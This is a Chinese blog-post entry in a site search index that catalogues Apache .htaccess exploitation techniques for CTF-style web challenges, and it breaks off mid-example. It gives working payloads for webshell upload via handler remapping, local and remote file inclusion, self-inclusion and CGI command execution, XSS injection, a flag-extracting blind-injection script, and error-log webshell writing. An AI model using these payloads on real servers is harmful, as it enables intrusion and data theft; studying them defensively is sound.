<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>.htaccess利用总结</title>
      <link href="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/"/>
      <url>/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>.htaccess是Apache服务器中的一个配置文件，里面存放着Apache服务器配置相关的指令。通过.htaccess文件我们能实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许、阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。<code>.htaccess</code>中<strong>注释符有<code>#</code>且支持<code>\</code>拼接上下两行。</strong></p><p>启动<code>.htaccess</code>我们需要将apache配置文件中的AllowOverride选项设置为All（默认为None）</p><p>需要注意的是<code>.htaccess</code>配置文件中的指令只对当前目录及其子目录生效，如果子目录也存在<code>.htaccess</code>文件，则子目录的配置优先于父目录，即<strong>子目录中的指令会覆盖父目录或者主配置中的指令。</strong></p><h2 id="常见使用方法"><a href="#常见使用方法" class="headerlink" title="常见使用方法"></a>常见使用方法</h2><h3 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h3><p>可以设置允许或禁止所有IP访问某文件或者禁止某IP访问，文件名可使用通配符和正则表达式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 禁止访问 .git、.env 等文件</span><br><span class="line">&lt;FilesMatch &quot;\.(env|git|sql|bak|ini)$&quot;&gt;</span><br><span class="line">    Order allow,deny</span><br><span class="line">    Deny from all   #禁止所有访问</span><br><span class="line">    Deny from 1.1.1.1 #禁止IP为1.1.1.1访问</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><h3 id="目录重定向"><a href="#目录重定向" class="headerlink" title="目录重定向"></a>目录重定向</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Redirect 301 /old /new</span><br></pre></td></tr></table></figure><p><strong>该规则会将&#x2F;old目录重定向到&#x2F;new目录</strong></p><h3 id="自定义错误页面"><a href="#自定义错误页面" class="headerlink" title="自定义错误页面"></a>自定义错误页面</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ErrorDocument 404 /errors/404.html</span><br><span class="line">ErrorDocument 500 /errors/500.html</span><br></pre></td></tr></table></figure><h3 id="URL-重定向与重写"><a href="#URL-重定向与重写" class="headerlink" title="URL 重定向与重写"></a>URL 重定向与重写</h3><p>该功能主要通过主要通过 <code>mod_rewrite</code> 模块实现，如文件扩展名处理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 隐藏.html扩展名（访问/about → about.html）</span><br><span class="line">RewriteCond %&#123;REQUEST_FILENAME&#125; !-d   #排查目录</span><br><span class="line">RewriteCond %&#123;REQUEST_FILENAME&#125;.html -f #检测html目录是否存在</span><br><span class="line">RewriteRule ^([^\.]+)$ $1.html  #重写规则</span><br><span class="line"></span><br><span class="line"># 强制添加斜杠（防止目录访问404）</span><br><span class="line">RewriteCond %&#123;REQUEST_FILENAME&#125; -d</span><br><span class="line">RewriteRule ^(.*[^/])$ %&#123;REQUEST_URI&#125;/ </span><br></pre></td></tr></table></figure><blockquote><p>**<code>%&#123;REQUEST_FILENAME&#125;</code>**：Apache 变量，表示用户请求路径对应的服务器物理路径</p><p>**<code>-d</code>**：测试是否为存在的目录</p></blockquote><h3 id="允许-禁止显示目录列表"><a href="#允许-禁止显示目录列表" class="headerlink" title="允许&#x2F;禁止显示目录列表"></a>允许&#x2F;禁止显示目录列表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 禁止目录列表</span><br><span class="line">Options -Indexes</span><br></pre></td></tr></table></figure><blockquote><p>对当前目录及所有子目录，访问无索引文件的目录时返回 <strong>403 Forbidden</strong> 错误。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 允许目录列表</span><br><span class="line">Options +Indexes</span><br></pre></td></tr></table></figure><h2 id="常见指令"><a href="#常见指令" class="headerlink" title="常见指令"></a>常见指令</h2><h3 id="SetHandler"><a href="#SetHandler" class="headerlink" title="SetHandler"></a>SetHandler</h3><p>SetHandler指令可以<strong>强制所有匹配的文件被一个指定的处理器处理。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><blockquote><p><strong>当前目录以及子目录所有文件将会被当作php解析。</strong></p></blockquote><h3 id="AddHandler"><a href="#AddHandler" class="headerlink" title="AddHandler"></a>AddHandler</h3><p>AddHandler 指令可以实现<strong>在文件扩展名与特定的处理器之间建立映射。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><blockquote><p><strong>扩展名为.jpg的文件会被当作php解析</strong></p></blockquote><h3 id="AddType"><a href="#AddType" class="headerlink" title="AddType"></a>AddType</h3><p>与AddHandler作用一样，AddType 指令可以将<strong>给定的文件扩展名映射到指定的内容类型。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><blockquote><p><strong>将jpg后缀文件当作php文件执行</strong></p></blockquote><h3 id="php-value"><a href="#php-value" class="headerlink" title="php_value"></a>php_value</h3><p>当PHP作为Apache模块时，可以通过Apache的配置文件如httpd.conf或.htaccess文件中的指令来修改php的配置。但需要有AllowOverride Options 或AllowOverride All 权限才可以。</p><p>查看<a href="https://www.php.net/manual/zh/configuration.changes.modes.php">配置可被设定范围</a>:</p><p><img src="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/QQ20250322-174707.png"></p><p>可以看到.htaccess只能用于<strong>PHP_INI_ALL或PHP_INI_PERDIR</strong>类型的指令。</p><p>然后可以在<a href="https://www.php.net/manual/zh/ini.list.php">php.ini配置选项列表中找到可用的指令</a>:</p><p><img src="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/QQ20250322-175445.png"></p><ul><li><strong>auto_prepend_file：在主文件解析之前自动解析包含的文件</strong></li><li><strong>auto_append_file：在主文件解析后自动解析包含的文件</strong></li></ul><p>可以设置<code>auto_prepend_file/auto_append_file</code>进行文件包含，包含的文件可以使用php伪协议：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#在主文件解析之前自动解析包含1.jpg的内容</span><br><span class="line">php_value auto_prepend_file 1.jpg</span><br><span class="line"></span><br><span class="line">#在主文件解析后自动解析2.jpg的内容</span><br><span class="line">php_value auto_append_file 2.jpg</span><br><span class="line"></span><br><span class="line">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=shell.txt&quot;</span><br></pre></td></tr></table></figure><h3 id="php-flag"><a href="#php-flag" class="headerlink" title="php_flag"></a>php_flag</h3><p>php_flag 用来设定<strong>布尔值的php 配置指令</strong>。</p><p>用法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_flag name on|off</span><br></pre></td></tr></table></figure><p><img src="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/QQ%E6%88%AA%E5%9B%BE20250322181309.png"></p><p>可以将 <code>engine</code> 设置为 0,在本目录和子目录中关闭 <code>php</code> 解析,造成源码泄露：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_flag engine 0</span><br></pre></td></tr></table></figure><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><h3 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h3><p>通过利用php_flag将<code>engine</code>设置为0，关闭php解析，从而造成源码泄露：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_flag engine 0</span><br></pre></td></tr></table></figure><p><img src="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/QQ20250322-213940.png"></p><p><img src="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/QQ20250322-213954.png"></p><h3 id="文件解析"><a href="#文件解析" class="headerlink" title="文件解析"></a>文件解析</h3><p>在设有黑名单的文件上传中，如果没有过滤.htaccess，我们可以通过上传.htaccess文件将图片作为php文件解析</p><p>可以使用的指令有:</p><ul><li><p><strong>SetHandler</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 将ma.jpg 当做 PHP 执行</span><br><span class="line">&lt;FilesMatch  &quot;ma.jpg&quot;&gt;</span><br><span class="line">SetHandler  application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure></li><li><p><strong>AddType&#x2F;AddHandler</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#将jpg后缀当作php代码执行</span><br><span class="line">AddHandler application/x-httpd-php .jpg</span><br><span class="line"></span><br><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/QQ20250322-214236.png"></p><p><img src="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/QQ20250322-214419.png"></p><p><img src="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/QQ20250322-214259.png"></p><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><h4 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h4><p>可通过php_value指令设置 <code>auto_prepend_file</code>或者 <code>auto_append_file</code> 配置选项包含一些敏感文件，但需要本目录或者子目录有可执行的php文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#在主文件解析之前自动解析包含ma.jpg的内容</span><br><span class="line">php_value auto_prepend_file ma.jpg</span><br><span class="line"></span><br><span class="line">#在主文件解析后自动解析ma.jpg的内容</span><br><span class="line">php_value auto_append_file ma.jpg</span><br></pre></td></tr></table></figure><p><img src="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/QQ20250322-215144.png"></p><p><img src="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/QQ20250322-215205.png"></p><h4 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h4><p><strong>前提：php.ini的配置选项<code>allow_url_include</code>、<code>allow_url_fopen</code>状态为ON使include&#x2F;require函数能够使用。</strong></p><blockquote><p>因为all_url_include 的配置范围为 PHP_INI_SYSTEM,所以无法利用 php_flag 在 .htaccess 中开启</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file http://xxx/ma.php</span><br></pre></td></tr></table></figure><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><h4 id="配合伪协议"><a href="#配合伪协议" class="headerlink" title="配合伪协议"></a>配合伪协议</h4><p>这里可利用<code>data://</code>伪协议进行命令执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#allow_url_fopen: on,allow_url_include: on </span><br><span class="line">php_value auto_append_file &quot;data://test/plain,&lt;?php phpinfo();?&gt;&quot;</span><br></pre></td></tr></table></figure><h4 id="解析-htaccess自身执行命令"><a href="#解析-htaccess自身执行命令" class="headerlink" title="解析.htaccess自身执行命令"></a>解析.htaccess自身执行命令</h4><p>不仅如此，.htaccess还可以通过包含自己来进行命令执行：</p><ul><li><p><strong>当前目录有php执行文件的情况下</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file .htaccess</span><br><span class="line">#&lt;?php phpinfo();</span><br></pre></td></tr></table></figure><p><img src="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/QQ20250322-220911.png"></p><p><img src="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/QQ20250322-221006.png"></p></li><li><p><strong>当前目录没有php执行文件的情况下</strong></p><p>关键：<strong>需要先设置允许可访问 .htaccess 文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files .htaccess&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">Require all granted</span><br><span class="line">php_flag engine on</span><br><span class="line">&lt;/Files&gt;</span><br><span class="line">php_value auto_prepend_file .htaccess</span><br><span class="line">#&lt;?php phpinfo();</span><br></pre></td></tr></table></figure><blockquote><p>也可以利用<code>&lt;FilesMatch</code></p></blockquote><p><img src="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/QQ20250322-221809.png"></p><p><img src="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/QQ20250322-221745.png"></p></li></ul><h4 id="CGI脚本执行"><a href="#CGI脚本执行" class="headerlink" title="CGI脚本执行"></a>CGI脚本执行</h4><p>参考：[De1CTF2020 check in](<a href="https://github.com/De1ta-team/De1CTF2020/tree/master/writeup/web/check">https://github.com/De1ta-team/De1CTF2020/tree/master/writeup/web/check</a> in)</p><p><strong>CGI（Common Gateway Interface）</strong> 是一种标准协议，允许 Web 服务器（如 Apache）与外部程序（如 Shell、Python、Perl 脚本）交互。即我们可以通过cgi来执行shell等脚本。</p><p>前提：<strong>启用了cgi模块，同时<code>cgi_module</code>需要加载，即apache配置文件中有</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LoadModule cgi_module modules/mod_cgi.so</span><br></pre></td></tr></table></figure><blockquote><p>启用cgi模块要根据 MPM 类型选择模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apache2ctl -V | grep MPM</span><br><span class="line"># 输出示例：Server MPM: prefork</span><br></pre></td></tr></table></figure><p><strong><code>prefork</code> MPM</strong> → 使用 <code>mod_cgi</code>：<code>a2enmod cgi</code></p><p><strong><code>worker</code>&#x2F;<code>event</code> MPM</strong> → 使用 <code>mod_cgid</code>：<code>a2enmod cgid</code></p></blockquote><p>在.htaccess文件中添加：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Options +ExecCGI   #允许在指定目录下执行 CGI脚本</span><br><span class="line">AddHandler cgi-script .sh  #将扩展名为 .sh 的文件关联到 CGI脚本处理器。</span><br></pre></td></tr></table></figure><p>再写一个简单的CGI脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Content-type: text/plain\r\n&quot;</span>  <span class="comment">#必需的HTTP头信息</span></span><br><span class="line"><span class="built_in">whoami</span></span><br></pre></td></tr></table></figure><p>访问sh文件即可：</p><p><img src="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/QQ20250322-231223.png"></p><p><img src="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/QQ20250322-231454.png"></p><blockquote><p>复现不成功可能是因为文件权限不够，可以赋予脚本执行权：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /var/www/html/1.sh</span><br></pre></td></tr></table></figure></blockquote><h4 id="FastCGI脚本执行"><a href="#FastCGI脚本执行" class="headerlink" title="FastCGI脚本执行"></a>FastCGI脚本执行</h4><p>与CGI一样可以和外部程序交互，但<code>mod_fcgid.so</code>需要被加载：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LoadModule fcgid_module modules/mod_fcgid.so</span><br></pre></td></tr></table></figure><blockquote><p>下载fcgid：<code>apt-get install libapache2-mod-fcgid</code></p><p>启动：<code>a2enmod fcgid</code></p></blockquote><p>.htaccess:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Options +ExecCGI  #允许在指定目录下执行CGI或FastCGI脚本。</span><br><span class="line">AddHandler fcgid-script .xx  #将扩展名为.xx 的文件关联到FastCGI处理器(mod_fcgid)。</span><br><span class="line">FcgidWrapper &quot;/bin/sh&quot; .xx  #指定用于执行.xx 文件的 解释器路径。</span><br></pre></td></tr></table></figure><p>1.xx:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Content-Type: text/plain&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">whoami</span></span><br></pre></td></tr></table></figure><p>访问1.xx即可</p><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><h4 id="highlight-file"><a href="#highlight-file" class="headerlink" title="highlight_file"></a>highlight_file</h4><p>主要通过.hataccess文件设定<strong>highlight.comment</strong>，指定高亮内容，进行XSS。</p><p>.htaccess:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value highlight.comment &#x27;&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&#x27;</span><br></pre></td></tr></table></figure><blockquote><p><code>highlight.comment</code> 是 PHP 的语法高亮配置选项，用于定义 <strong>注释部分的颜色</strong>（如 <code>#FF8000</code>）。</p></blockquote><p>其中highlight.comment也可换成如下其他选项：</p><p><img src="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/QQ20250323-153718.png"></p><p>1.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// comment</span></span><br></pre></td></tr></table></figure><p>原理就是<code>highlight_file(__FILE__)</code>函数会输出当前文件的内容，并用PHP语法高亮显示。这意味着<strong>它会将PHP代码转换为带有颜色标记的HTML代码。</strong>注释部分（以<code>//</code>或<code>#</code>开头的行，以及<code>/* */</code>之间的内容）会根据<code>highlight.comment</code>的设置进行高亮，当定义高亮内容时，<strong>PHP会将内容直接穿插在<code>&lt;span&gt;</code>标签的style属性中，且未转义特殊字符</strong>，导致HTML结构被破坏，即最后产生的HTML片段为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&quot;color: &quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1);<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;&gt;// comment<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>刚好闭合了前面的<code>&lt;&quot;</code></strong></p></blockquote><p><img src="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/QQ20250323-155658.png"></p><p><img src="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/QQ20250323-154715.png"></p><h4 id="错误信息链接"><a href="#错误信息链接" class="headerlink" title="错误信息链接"></a>错误信息链接</h4><p>通过 <code>.htaccess</code> 设置 <code>php_value docref_root</code>，结合 PHP 错误信息的 <strong>HTML 渲染机制</strong>，可在错误页面中注入<strong>未转义的脚本代码</strong>，触发 XSS 攻击。</p><p>1.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;foo&#x27;</span>);<span class="comment">#包含不存在的文件促发PHP错误</span></span><br></pre></td></tr></table></figure><p>.htaccess：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_flag display_errors 1       # 允许显示错误信息</span><br><span class="line">php_flag html_errors 1          # 将错误信息格式化为HTML</span><br><span class="line">php_value docref_root &quot;&#x27;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&quot;  # 注入恶意字符串</span><br></pre></td></tr></table></figure><blockquote><p><code>docref_root</code> 是 PHP 的配置选项，用于定义 <strong>错误消息中链接的 PHP 官方文档的根 URL</strong>，这里直接改成我们的恶意代码</p></blockquote><p><img src="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/QQ20250323-162725.png"></p><h3 id="利用404页面盲注"><a href="#利用404页面盲注" class="headerlink" title="利用404页面盲注"></a>利用404页面盲注</h3><p>.htaccess：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;If &quot;file(&#x27;/flag&#x27;) =~ &#x27;/flag&#123;a/&#x27;&quot;&gt;</span><br><span class="line">ErrorDocument 404 &quot;b1uel0n3&quot;</span><br><span class="line">&lt;/If&gt;</span><br></pre></td></tr></table></figure><p>利用匹配成功返回带有b1uel0n3的404内容进行盲注来获取flag</p><p>盲注脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">TARGET_URL = <span class="string">&quot;http://example.com/upload.php&quot;</span>  <span class="comment"># 文件上传接口</span></span><br><span class="line">CHECK_URL = <span class="string">&quot;http://example.com/not_exist_path&quot;</span>  <span class="comment"># 触发404的路径</span></span><br><span class="line">FLAG_PREFIX = <span class="string">&quot;flag&#123;&quot;</span>  <span class="comment"># Flag已知前缀</span></span><br><span class="line">CHARSET = string.ascii_letters + string.digits + <span class="string">&quot;_!@#$%^&amp;*()-=+&#123;&#125;&quot;</span>  <span class="comment"># 字符集</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_htaccess</span>(<span class="params">payload</span>):</span><br><span class="line">    files = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;.htaccess&#x27;</span>, payload, <span class="string">&#x27;text/plain&#x27;</span>)&#125;</span><br><span class="line">    r = requests.post(TARGET_URL, files=files)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text  <span class="comment"># 根据上传接口返回判断是否成功</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_response</span>():</span><br><span class="line">    r = requests.get(CHECK_URL)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;b1uel0n3&quot;</span> <span class="keyword">in</span> r.text  <span class="comment"># 自定义404响应关键词</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blind_injection</span>():</span><br><span class="line">    flag = FLAG_PREFIX</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        found = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> CHARSET:</span><br><span class="line">            current_guess = flag + c</span><br><span class="line">            <span class="comment"># 构造正则匹配规则：当前猜测字符 + 后续任意字符直到&#125;</span></span><br><span class="line">            regex = <span class="string">f&quot;^<span class="subst">&#123;re.escape(current_guess)&#125;</span>.*\\&#125;&#125;$&quot;</span></span><br><span class="line">            htaccess_content = <span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;If &quot;file(&#x27;/flag&#x27;) =~ /<span class="subst">&#123;regex&#125;</span>/&quot;&gt;</span></span><br><span class="line"><span class="string">    ErrorDocument 404 &quot;b1uel0n3&quot;</span></span><br><span class="line"><span class="string">&lt;/If&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> upload_htaccess(htaccess_content):</span><br><span class="line">                <span class="keyword">if</span> check_response():</span><br><span class="line">                    flag += c</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[+] Current Flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">                    found = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">if</span> c == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;[!] Flag found:&quot;</span>, flag)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] Failed to find next character&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    blind_injection()</span><br></pre></td></tr></table></figure><h3 id="利用报错日志写马"><a href="#利用报错日志写马" class="headerlink" title="利用报错日志写马"></a>利用报错日志写马</h3><p>参考：[<a href="https://buuoj.cn/challenges#[XNUCA2019Qualifier]EasyPHP">XNUCA2019Qualifier]EasyPHP</a></p><p>思路就是error_log能将<strong>PHP运行报错的记录写到指定文件</strong>，而<code>include_path</code> 是 PHP 的配置选项，用于定义 PHP 在包含文件（如 <code>include</code>、<code>require</code>）时搜索文件的目录列表。当使用相对路径或未指定路径时，<strong>PHP 会按照 <code>include_path</code> 中设置的目录顺序查找文件。</strong></p><p><strong>所以我们通过.htaccess文件设定error_log选项来定义我们错误文件的存储路径，再配合include_path将🐎当作错误路径解析从而将🐎写入文件</strong></p><p>error.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;fooo&#x27;</span>);<span class="comment">#包含不存在的文件促发PHP错误</span></span><br></pre></td></tr></table></figure><p>.htaccess：</p><figure class="highlight plaintext"><table><tr><td 